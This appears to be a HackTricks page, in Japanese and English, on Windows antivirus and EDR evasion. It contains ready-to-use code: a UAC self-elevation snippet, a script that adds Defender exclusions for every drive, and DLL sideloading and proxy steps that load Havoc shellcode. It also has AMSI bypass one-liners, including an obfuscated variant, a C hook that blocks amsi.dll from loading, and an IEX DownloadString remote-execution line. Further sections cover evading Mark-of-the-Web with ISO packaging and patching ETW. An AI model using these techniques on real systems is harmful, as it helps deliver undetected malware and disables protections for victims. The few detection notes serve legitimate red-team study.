# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは最初に** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました！**

## Defenderを停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを偽装してWindows Defenderの動作を停止するツール。
- [管理者ならDefenderを無効化する](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前のインストーラー風UAC誘導

公開ローダーはゲームチートを装い、署名されていないNode.js/Nexeインストーラーとして配布されることが多く、まず **ユーザーに昇格を要求し**、その後でDefenderを無効化する。流れは単純である:

1. `net session` を使って管理者コンテキストを確認する。このコマンドは呼び出し元が管理者権限を持つ場合にのみ成功するため、失敗した場合はローダーが標準ユーザーとして実行されていることを示す。
2. 元のコマンドラインを保持したまま `RunAs` verb で即座に自分自身を再起動し、想定されるUACの同意プロンプトを表示させる。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに「cracked」softwareをインストールしていると思い込んでいるため、このプロンプトは通常受け入れられ、malwareにDefenderのpolicyを変更するために必要な権限が与えられます。

### すべてのドライブ文字に対する包括的な `MpPreference` exclusions

昇格後、GachiLoader-styleのチェーンは、サービスを完全に無効化する代わりに、Defenderの盲点を最大化します。loaderはまずGUI watchdog（`taskkill /F /IM SecHealthUI.exe`）を終了し、その後、**非常に広範な exclusions** を適用して、すべてのuser profile、system directory、removable disk がスキャン不能になるようにします：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> Windows Defender の static detection を確認する良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) です。基本的にはファイルを複数のセグメントに分割し、それぞれを Defender に個別に scan させます。これにより、binary のどの strings や bytes がフラグされたのかを正確に特定できます。

実践的な AV Evasion についてのこの [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) も強くおすすめします。

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> 回避のために payload を修正する際は、Defender の **automatic sample submission** を必ずオフにし、そして本気で、長期的に evasion を目指すなら **絶対に VIRUSTOTAL にアップロードしないでください**。特定の AV で payload が検出されるか確認したいなら、VM にその AV を入れ、automatic sample submission をオフにできるならオフにして、結果に満足するまでそこで test してください。

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムの一覧と、それらが読み込もうとする DLL ファイルを出力します。

**DLL Hijackable/Sideloadable programs** はぜひ自分で**調査することを強くおすすめ**します。この technique は、適切に行えばかなり stealthy ですが、公開されている DLL Sideloadable programs を使うと、簡単に捕まる可能性があります。

プログラムが読み込むと想定している名前の malicious DLL を置いただけでは、payload は実行されません。というのも、そのプログラムはその DLL 内の特定の functions を期待しているからです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使います。

**DLL Proxying** は、program が proxy（および malicious）DLL に対して行う呼び出しを original DLL に forward することで、program の機能を維持しつつ、payload の execution を扱えるようにします。

私は [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を [@flangvik](https://twitter.com/Flangvik/) から使用します。

以下が私が行った steps です:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドで 2 つのファイルが得られます: DLL ソースコードテンプレートと、元のリネームされた DLL です。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
これらは結果です:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[SGN](https://github.com/EgeBalci/sgn) でエンコードした私たちの shellcode と proxy DLL の両方が、[antiscan.me](https://antiscan.me) で 0/26 の Detection rate でした! これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading については [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) を、さらに詳しく知るために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を、**強くおすすめ**します。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE モジュールは、実際には "forwarders" である関数を export できます: コードへのポインタの代わりに、export エントリには `TargetDll.TargetFunc` 形式の ASCII 文字列が含まれます。呼び出し側が export を解決すると、Windows loader は次を行います:

- まだ loaded されていなければ `TargetDll` を load する
- そこから `TargetFunc` を resolve する

理解すべき重要な動作:
- `TargetDll` が KnownDLL である場合、保護された KnownDLLs namespace から提供されます（例: ntdll, kernelbase, ole32）。
- `TargetDll` が KnownDLL でない場合、通常の DLL search order が使われ、forward resolution を行っている module の directory も含まれます。

これにより、間接的な sideloading の primitive が可能になります: ある関数を non-KnownDLL module 名へ forwarded している署名付き DLL を見つけ、その署名付き DLL を、forwarded target module とまったく同じ名前の attacker-controlled DLL と同じ場所に置きます。forwarded export が呼び出されると、loader は forward を解決して同じ directory からあなたの DLL を load し、あなたの DllMain を実行します。

Windows 11 で観測された例:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないので、通常の検索順序で解決される。

PoC (copy-paste):
1) 署名済みのシステム DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置する。最小限の DllMain だけで code execution を得るには十分で、DllMain をトリガーするために forwarded function を実装する必要はない。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名済み LOLBin で転送をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) が side-by-side の `keyiso.dll` (signed) を読み込む
- `KeyIsoSetAuditingInterface` を解決中に、ローダーは forward を `NCRYPTPROV.SetAuditingInterface` へたどる
- その後ローダーは `C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合でも、"missing API" エラーが出るのは `DllMain` がすでに実行された後

Hunting tips:
- ターゲットモジュールが KnownDLL ではない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
- 以下のようなツールを使って forwarded exports を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには Windows 11 forwarder inventory を参照: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins（例: rundll32.exe）が non-system パスから signed DLLs をロードし、その後に同じベース名を持つ non-KnownDLLs をそのディレクトリからロードするのを監視する
- 次のような process/module chains に alert を出す: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths 下の `NCRYPTPROV.dll`
- code integrity policies（WDAC/AppLocker）を適用し、application directories での write+execute を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使って、stealthy に shellcode を load して execute できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 回避は単なる猫とネズミのゲームで、今日有効なものが明日には検出されるかもしれないので、1つのツールだけに頼らないでください。可能であれば、複数の回避技術を連携させてみてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRはしばしば `ntdll.dll` の syscall スタブに対して **user-mode inline hooks** を仕掛けます。これらのフックを回避するには、正しい **SSN** (System Service Number) を読み込み、フックされた export entrypoint を実行せずに kernel mode へ遷移する **direct** または **indirect** syscall スタブを生成できます。

**Invocation options:**
- **Direct (embedded)**: 生成されたスタブ内に `syscall`/`sysenter`/`SVC #0` 命令を埋め込みます (`ntdll` の export はヒットしません)。
- **Indirect**: `ntdll` 内の既存の `syscall` gadget へジャンプし、kernel transition が `ntdll` から発生したように見せます（heuristic evasion に有用）。**randomized indirect** は呼び出しごとに pool から gadget を選びます。
- **Egg-hunt**: ディスク上に static な `0F 05` opcode sequence を埋め込まないようにし、runtime で syscall sequence を解決します。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes を読む代わりに、syscall stubs を virtual address で sort して SSN を推測します。
- **SyscallsFromDisk**: クリーンな `\KnownDlls\ntdll.dll` を map し、その `.text` から SSN を読み取り、その後 unmap します（memory 上のすべての hooks を bypass します）。
- **RecycledGate**: stub が clean な場合は VA-sort による SSN 推測と opcode validation を組み合わせ、hook されている場合は VA 推測に fallback します。
- **HW Breakpoint**: `syscall` 命令上に DR0 を設定し、VEH を使って runtime で `EAX` から SSN を capture します。hook された bytes を parse せずに済みます。

SysWhispers4 の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI は "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" を防ぐために作られました。最初期の AV は **ディスク上のファイル** しかスキャンできなかったため、もしペイロードを **直接メモリ上で** 実行できれば、AV にはそれを止める手段がありませんでした。十分な可視性がなかったからです。

AMSI 機能は、Windows の以下のコンポーネントに統合されています。

- User Account Control, または UAC（EXE、COM、MSI、または ActiveX のインストールの昇格）
- PowerShell（スクリプト、対話的な利用、動的コード評価）
- Windows Script Host（wscript.exe と cscript.exe）
- JavaScript と VBScript
- Office VBA macros

これにより、スクリプト内容を暗号化されておらず、かつ難読化されていない形式で公開することで、antivirus ソリューションがスクリプトの挙動を検査できるようになります。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defender では次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` が先頭に付き、その後にスクリプトが実行された実行ファイルの path が続いていることに注目してください。この例では powershell.exe です。

ディスク上には何も drop していませんが、AMSI により in-memory で検知されました。

さらに、**.NET 4.8** 以降では、C# code も AMSI を通して実行されます。これは in-memory execution のために `Assembly.Load(byte[])` を使う場合にも影響します。そのため、AMSI を evade したいなら、より低いバージョンの .NET（4.7.2 以下など）を使うことが推奨されます。

AMSI を回避する方法はいくつかあります。

- **Obfuscation**

AMSI は主に静的検知で動作するため、読み込もうとするスクリプトを変更することは、検知回避に有効な方法になり得ます。

ただし AMSI には、複数層の難読化があってもスクリプトを unobfuscate する能力があるため、やり方によっては obfuscation は悪手になり得ます。これにより、回避はそれほど単純ではなくなります。とはいえ、変数名をいくつか変えるだけで十分な場合もあるので、どれだけフラグ付けされているか次第です。

- **AMSI Bypass**

AMSI は powershell（同様に cscript.exe、wscript.exe など）のプロセスに DLL をロードして実装されているため、非特権ユーザーとして実行していても簡単に tamper できます。AMSI の実装上のこの欠陥により、研究者たちは AMSI スキャンを evade する複数の方法を発見しています。

**Forcing an Error**

AMSI 初期化の失敗（amsiInitFailed）を強制すると、現在のプロセスではスキャンが開始されなくなります。これは元々 [Matt Graeber](https://twitter.com/mattifestation) により公開され、その後 Microsoft はより広く使われるのを防ぐためのシグネチャを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
AMSI を現在の powershell プロセスで使用不能にするには、たった 1 行の powershell code で十分でした。もちろん、この 1 行自体は AMSI によってフラグ付けされるため、この technique を使うには何らかの modification が必要です。

ここでは、この [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取得した修正版の AMSI bypass を示します。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この技法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見され、`amsi.dll` 内の "AmsiScanBuffer" 関数のアドレスを見つけて、`E_INVALIDARG` のコードを返す命令で上書きすることを含みます。これにより、実際のスキャン結果は 0 を返し、これはクリーンな結果として解釈されます。

> [!TIP]
> より詳しい説明については [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) を読んでください。

PowerShell を使って AMSI を bypass するための他の多くの技法もあります。詳しくは [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を確認してください。

### amsi.dll の load を防いで AMSI を block する (LdrLoadDll hook)

AMSI は、`amsi.dll` が現在の process に load された後にのみ initialised されます。堅牢で language-agnostic な bypass は、`ntdll!LdrLoadDll` に user-mode hook を置き、要求された module が `amsi.dll` の場合に error を返すことです。その結果、AMSI は load されず、その process では scan は一切行われません。

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript、カスタムローダーなど、AMSI を読み込むものなら何でも横断的に機能する。
- 長いコマンドラインの痕跡を避けるため、スクリプトを stdin 経由で渡す（`PowerShell.exe -NoProfile -NonInteractive -Command -`）のと組み合わせる。
- LOLBins 経由で実行されるローダーで使われているのが確認されている（例: `regsvr32` が `DllRegisterServer` を呼び出す）。

ツール **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** は、AMSI を bypass するためのスクリプトも生成する。
ツール **[https://amsibypass.com/](https://amsibypass.com/)** も、ランダム化されたユーザー定義関数、変数、文字式を使ってシグネチャを回避し、さらに PowerShell キーワードにランダムな文字の大文字小文字を適用してシグネチャ回避を行う AMSI bypass スクリプトを生成する。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** と **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使って、現在のプロセスのメモリから検出された AMSI シグネチャを削除できる。このツールは、現在のプロセスのメモリをスキャンして AMSI シグネチャを探し、見つかった箇所を NOP 命令で上書きすることで、実質的にメモリから削除する。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で見つけられる。

**Powershell version 2 を使う**
PowerShell version 2 を使えば AMSI は読み込まれないため、AMSI にスキャンされずにスクリプトを実行できる。次のようにできる:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドをログに記録できる機能です。監査やトラブルシューティングには役立ちますが、**検知を回避したい攻撃者にとっては問題**にもなります。

PowerShell logging を bypass するには、次の techniques を使えます:

- **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のような tool を使えます。
- **Use Powershell version 2**: PowerShell version 2 を使うと AMSI は load されないため、AMSI に scan されずに scripts を実行できます。次のようにできます: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って、defenses なしの powershell を spawn します（これは Cobal Strike の `powerpick` が使っているものです）。


## Obfuscation

> [!TIP]
> いくつかの obfuscation techniques は data の encrypting に依存しており、その結果 binary の entropy が増加します。これにより AVs や EDRs が検知しやすくなるため注意してください。これを踏まえ、必要な場合や hidden にする必要がある sensitive な code の特定部分だけに encryption を適用するのがよいでしょう。

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または commercial forks）を使う malware を分析するとき、decompilers や sandboxes を block する複数の protection layers に直面するのが一般的です。以下の workflow は、後で dnSpy や ILSpy などの tools で C# に decompiled できる、ほぼ元の状態の IL を確実に **restores** します。

1.  Anti-tampering removal – ConfuserEx はすべての *method body* を encrypt し、*module* static constructor (`<Module>.cctor`) 内で decrypt します。これは PE checksum も patch するため、変更すると binary は crash します。**AntiTamperKiller** を使って encrypted metadata tables を locate し、XOR keys を recover して、きれいな assembly を rewrite します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output には 6 つの anti-tamper parameters（`key0-key3`, `nameHash`, `internKey`）が含まれており、自分で unpacker を build する際に役立ちます。

2.  Symbol / control-flow recovery – **de4dot-cex**（ConfuserEx を認識する de4dot の fork）に *clean* file を入力します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile を選択します
• de4dot は control-flow flattening を undo し、元の namespaces、classes、variable names を restore し、constant strings を decrypt します。

3.  Proxy-call stripping – ConfuserEx は直接の method calls を軽量な wrappers（a.k.a *proxy calls*）に置き換えて、decompilation をさらに妨害します。**ProxyCall-Remover** でそれらを remove します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
この step の後は、`Class8.smethod_10` などの不明瞭な wrapper functions の代わりに、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が見えるはずです。

4.  Manual clean-up – 結果の binary を dnSpy で実行し、大きな Base64 blobs や `RijndaelManaged`/`TripleDESCryptoServiceProvider` の use を search して *real* payload を locate します。多くの場合、malware はそれを `<Module>.byte_0` 内で initialised される TLV-encoded byte array として保存しています。

上記の chain により、悪意ある sample を実行することなく execution flow を restores できます。オフラインの workstation で作業する場合に有用です。

> 🛈  ConfuserEx は `ConfusedByAttribute` という custom attribute を生成します。これは samples を自動的に triage する IOC として使えます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と改ざん耐性を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、外部ツールを使用せず、コンパイラを変更することなく、`C++11/14` 言語を使ってコンパイル時に obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成された obfuscated operations のレイヤーを追加し、アプリケーションを crack したい人の作業を少しだけ難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe、.dll、.sys を含むさまざまな pe files を obfuscate できます
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の executable 向けのシンプルな metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は、ROP (return-oriented programming) を使用する LLVM 対応言語向けの高精度な code obfuscation framework です。ROPfuscator は、通常の instructions を ROP chains に変換することで assembly code レベルで program を obfuscate し、通常の control flow に対する自然な認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換し、その後それらを load できます

## SmartScreen & MoTW

インターネットからいくつかの executable をダウンロードして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、潜在的に悪意のある applications の実行からエンドユーザーを保護するための security mechanism です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主に reputation-based approach で動作し、あまり一般的でない download applications は SmartScreen をトリガーして、エンドユーザーに file の実行を警告・防止します（ただし、More Info -> Run anyway をクリックすれば file は引き続き実行できます）。

**MoTW** (Mark of The Web) は、[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、Zone.Identifier という名前を持ち、インターネットから file を download した際に、download 元の URL とともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットから download した file の Zone.Identifier ADS を確認しているところ。</p></figcaption></figure>

> [!TIP]
> trusted な signing certificate で署名された executables は **SmartScreen をトリガーしない** ことに注意してください。

payloads に Mark of The Web が付かないようにする非常に効果的な方法は、ISO のような container の中にそれらをパッケージ化することです。これは、Mark-of-the-Web (MOTW) を **non NTFS** ボリュームには適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、Mark-of-the-Web を回避するために payloads を output containers にパッケージ化する tool です。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
SmartScreen をバイパスするデモです。payload を [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使って ISO ファイル内にパッケージ化しています。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windows の強力なログ記録メカニズムで、アプリケーションやシステムコンポーネントが**イベントをログ**できるようにします。ただし、セキュリティ製品が悪意ある活動を監視・検出するためにも使えます。

AMSI を無効化（バイパス）するのと同様に、ユーザースペースプロセスの **`EtwEventWrite`** 関数を、何もログせずに即座に return させることも可能です。これは、メモリ上の関数をパッチして即座に return するようにし、そのプロセスの ETW ログ記録を事実上無効化することで実現します。

